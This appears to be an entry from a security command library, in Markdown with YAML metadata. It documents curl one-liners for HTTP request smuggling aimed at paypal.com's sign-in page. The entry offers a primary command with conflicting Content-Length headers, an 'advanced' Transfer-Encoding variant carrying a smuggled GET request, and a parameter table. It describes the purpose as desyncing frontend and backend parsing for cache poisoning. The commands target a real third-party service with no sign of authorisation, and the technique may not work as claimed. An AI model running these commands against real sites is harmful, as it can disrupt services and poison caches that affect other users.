---
data: >-
  curl -H "Host: paypal.com" -H "Content-Length: 0" -H "Content-Length: 5" -d
  "smuggled data" https://paypal.com/signin --http1.1
tags:
  - http-request-smuggling
  - web-testing
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: bd5de336-521a-4e35-97f7-c5e588bbf960
created_at: '2025-12-11T06:10:40.609Z'
updated_at: '2025-12-11T06:10:40.609Z'
verified: false
validated: true
submitted: true
---
# curl-http-smuggling-test

## Command

```bash
curl -H "Host: paypal.com" -H "Content-Length: 0" -H "Content-Length: 5" -d "smuggled data" https://paypal.com/signin --http1.1
```

## Description

This command tests for HTTP Request Smuggling by sending conflicting Content-Length headers to desync frontend and backend parsing, useful for cache poisoning.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H "Content-Length: 0"` | First Content-Length to desync | Yes |
| `-H "Content-Length: 5"` | Second Content-Length for smuggling | Yes |
| `-d "smuggled data"` | Data to smuggle | Yes |
| `--http1.1` | Force HTTP/1.1 protocol | Yes |

## Examples

### Basic Usage

```bash
curl -H "Host: target.com" -H "Content-Length: 0" -H "Content-Length: 5" -d "test" https://target.com --http1.1
```

### Advanced Usage

```bash
curl -H "Host: paypal.com" -H "Transfer-Encoding: chunked" -d "0\r\n\r\nGET / HTTP/1.1" https://paypal.com/signin --http1.1
```

## Expected Output

A response showing desync, such as unexpected redirects or content, indicating successful smuggling.

## Related

- [[commands/burp-request-manipulation]]
- [[procedures/Exploit-HTTP-Request-Smuggling-for-Cached-Redirect]]
